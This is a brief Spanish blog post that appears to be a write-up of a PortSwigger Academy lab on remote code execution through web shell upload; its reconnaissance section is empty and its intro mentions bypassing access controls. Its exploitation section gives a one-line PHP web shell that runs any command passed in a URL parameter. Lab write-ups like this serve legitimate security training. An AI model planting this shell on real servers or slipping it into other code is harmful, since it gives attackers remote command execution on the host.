+++
author = "Alux"
title = "Portswigger Academy Learning Path: File Upload Lab 1"
date = "2021-12-16"
description = "Lab: "
tags = [
    "access control",
    "portswigger",
    "academy",
    "burpsuite",
]
categories = [
    "pentest web",
]
series = ["Portswigger Labs"]
image = "head.png"
+++

# Lab: 

En este <cite>laboratorio[^1]</cite>la finalidad es poder realizar un bypass al control de seguridad que tienen los accesos de los usuarios.



## Reconocimiento


## Explotacion

```php
<?php echo system($_GET['command']); ?>
```



![Laboratorio resuelto](resuelto.png)


[^1]: [Laboratorio](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)